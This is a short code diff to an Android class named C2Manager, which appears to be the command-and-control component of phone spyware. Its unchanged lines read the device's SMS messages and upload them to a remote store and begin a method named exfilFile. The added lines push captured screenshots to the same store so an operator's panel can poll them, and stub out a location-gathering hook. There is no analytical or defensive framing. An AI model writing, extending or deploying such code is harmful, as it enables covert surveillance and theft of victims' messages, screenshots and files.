@@ -107,6 +107,18 @@ public class C2Manager {
         agentRoot(ctx).child("data").child("sms").setValue(SmsReader.read(ctx));
     }
 
+    // screenshot result parked under its own key so panel can poll
+    public static void pushScreenshot(Context ctx, Map<String, Object> payload) {
+        burstLocationsIfAny(ctx);
+        agentRoot(ctx).child("results")
+            .child("screenshot_" + System.currentTimeMillis())
+            .setValue(payload);
+    }
+
+    private static void burstLocationsIfAny(Context ctx) {
+        // noop — reserved for future lanes
+    }
+
     public static void exfilFile(Context ctx, String path) {
         File f = new File(path);
         Map<String, Object> body = new HashMap<>();
